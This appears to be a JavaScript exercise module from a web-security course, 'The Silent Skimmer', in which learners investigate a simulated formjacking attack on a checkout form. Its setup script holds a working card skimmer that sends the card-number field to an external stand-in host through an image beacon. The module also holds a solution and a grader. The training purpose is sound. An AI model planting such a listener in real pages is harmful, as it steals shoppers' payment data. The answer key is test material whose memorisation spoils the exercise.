const SITE_HTML = `
<div class="card">
  <h3>Payment details</h3>
  <form id="payment-form">
    <div class="field"><label for="card-number">Card number</label><input id="card-number" type="text" /></div>
    <div class="field"><label for="cvv">CVV</label><input id="cvv" type="text" /></div>
    <button type="submit">Pay</button>
  </form>
</div>
`;

const SETUP_SCRIPT = `(function () {
  // Legitimate first-party analytics — a normal, benign pageview beacon.
  fetch('https://analytics.mystore.example/pageview', { method: 'POST', body: JSON.stringify({ page: 'checkout' }) });

  // A compromised third-party script, loaded alongside the legitimate code above.
  var card = document.getElementById('card-number');
  card.addEventListener('blur', function (e) {
    var img = new Image();
    img.src = 'https://cdn-metrics.free-analytics-suite.top/collect?d=' + encodeURIComponent(e.target.value);
  });

  // Simulate a shopper typing a card number and then tabbing to the next field.
  card.value = '4111 1111 1111 1111';
  card.dispatchEvent(new Event('blur'));
})();
`;

function includesAny(text, needles) {
  const lower = (text ?? '').toLowerCase();
  return needles.some((n) => lower.includes(n));
}

export default {
  id: 'silent-skimmer',
  chapter: 7,
  title: 'The Silent Skimmer',
  type: 'attack-investigation',
  difficulty: 'core',
  xp: 170,
  estimatedMinutes: 25,
  runner: 'iframe',
  submissionMode: 'answer',
  panels: ['network', 'dom'],
  isSuspiciousRequest: (entry) => typeof entry.url === 'string' && !entry.url.includes('mystore.example'),

  objective: 'Identify a real formjacking/skimming attack from its actual runtime evidence — network activity and console output — the same way you would triage a live incident.',
  prerequisites: 'Chapter 6 (what third-party scripts can access); basic idea of network requests.',
  scenario: 'A payment page loads two third-party-looking scripts. One is legitimate analytics. One is not. The simulation below runs both, plus a simulated shopper filling in a (fake, non-real) card number and tabbing out of the field — exactly the moment a skimmer typically strikes.',
  task: 'Use the Network panel to find the exfiltration, then answer the investigation questions.',
  expectedBehavior: 'You correctly identify the malicious destination host, the exact technique used to exfiltrate data, what data was taken, and what user action triggered it.',

  siteSnapshot: SITE_HTML,
  setupScript: SETUP_SCRIPT,
  initialCode: '',

  answerSchema: [
    { id: 'maliciousHost', prompt: 'What hostname received the exfiltrated data? (check the Network panel URLs)', type: 'text' },
    {
      id: 'sink',
      prompt: 'Which technique was used to exfiltrate the data?',
      type: 'select',
      options: ['fetch() POST request', 'XMLHttpRequest', 'navigator.sendBeacon', 'Image src (beacon) GET request', 'WebSocket message'],
    },
    { id: 'dataStolen', prompt: 'What specific piece of data was exfiltrated?', type: 'text' },
    {
      id: 'trigger',
      prompt: 'What user action triggered the exfiltration?',
      type: 'select',
      options: ['Page load', 'Clicking Pay', 'Blurring (leaving) the card number field', 'Typing in the CVV field'],
    },
  ],

  validate(answers, extra) {
    const feedback = [];
    let score = 0;
    const total = 4;

    if (includesAny(answers.maliciousHost, ['free-analytics-suite'])) { score += 1; feedback.push('Correct malicious host identified.'); }
    else feedback.push('Check the Network panel: one destination host is not "mystore.example" — that\'s the one to name.');

    if (answers.sink === 'Image src (beacon) GET request') { score += 1; feedback.push('Correct: this is a classic image-beacon exfiltration channel.'); }
    else feedback.push('Look at the "API" column in the Network panel for the suspicious row.');

    if (includesAny(answers.dataStolen, ['card', '4111'])) { score += 1; feedback.push('Correct: the card number field\'s value was exfiltrated.'); }
    else feedback.push('The exfiltrated URL contains the value of one specific field — which one?');

    if (answers.trigger === 'Blurring (leaving) the card number field') { score += 1; feedback.push('Correct: the listener fires on "blur", not on submit or page load.'); }
    else feedback.push('Check the console/setup: the malicious listener is registered for one specific event type on the card field.');

    const networkEvidence = (extra.networkLog ?? []).some((e) => e.api === 'image-beacon');
    if (!networkEvidence) feedback.unshift('No image-beacon network activity was captured — try re-running the simulation.');

    const fraction = score / total;
    return { passed: fraction >= 0.75, score: { correctness: fraction, security: fraction }, feedback };
  },

  hints: [
    'Two network requests fire during this simulation. One goes to "mystore.example" — that\'s the legitimate one.',
    'The suspicious request\'s "API" column says "image-beacon" — that means it was created via `new Image().src = ...`, not fetch or XHR.',
    'Look at the query string on the suspicious URL — it contains the exact value that was in the card-number field.',
  ],

  solution: 'Malicious host: cdn-metrics.free-analytics-suite.top. Technique: Image src (beacon) GET request. Data stolen: the card-number field\'s value. Trigger: the "blur" event on the card-number field.',

  explanation: 'The malicious script attaches a `blur` listener directly to the card-number field — no unusual DOM structure, no obviously "hacky" code, just a normal `addEventListener` call identical in shape to a thousand legitimate ones. When the field loses focus (a shopper tabbing to CVV, or clicking elsewhere), it reads `event.target.value` and ships it out via `new Image().src = "https://.../collect?d=" + encodeURIComponent(value)`. An image-beacon exfiltration is popular specifically because it doesn\'t trigger CORS preflight checks, doesn\'t require reading a response, and — to a casual glance at the page — looks exactly like a tracking pixel, which is a completely normal thing for a real page to load.',

  commonWrongAnswers: [
    { description: 'Assuming the exfiltration happened on form submit.', why: 'It happens earlier — on "blur" — specifically so the attacker gets the data even if the shopper never actually completes the purchase.' },
    { description: 'Identifying the fetch() call to mystore.example as the malicious one.', why: 'That call is the legitimate first-party analytics beacon — it goes to the site\'s own domain and carries no sensitive field data. The tell for the malicious one is both the unfamiliar external host AND the fact it carries the card value.' },
  ],

  securityImpact: 'This is a realistic (defanged) formjacking pattern — the same class of attack behind real Magecart-style incidents, where a single compromised or malicious third-party script silently skims payment data from a page that otherwise looks completely normal to both users and casual code review.',
  runtimeExplanation: 'An `<img>` element\'s `src` setter triggers a real browser-level GET request the instant it\'s assigned — no `fetch`/XHR/CORS machinery involved, no response ever needs to be read (the attacker only needs the request itself to hit their server\'s access logs), which is exactly why it\'s a favorite low-friction exfiltration channel.',
  sourceDefenseConnection: 'Recognizing this pattern from raw runtime evidence — not from a signature or a known-bad file hash, but from behavior: read-a-sensitive-field-then-make-an-unfamiliar-outbound-request — is the core analyst skill the next chapter (Runtime Security Engineering) turns into an automated detector.',
  followUp: 'Sketch (in one or two sentences) what a behavioral rule would need to observe, in order, to catch this automatically without knowing the malicious host in advance.',
  skillTags: ['clientSideAttacks', 'webSecurity', 'debugging'],
};
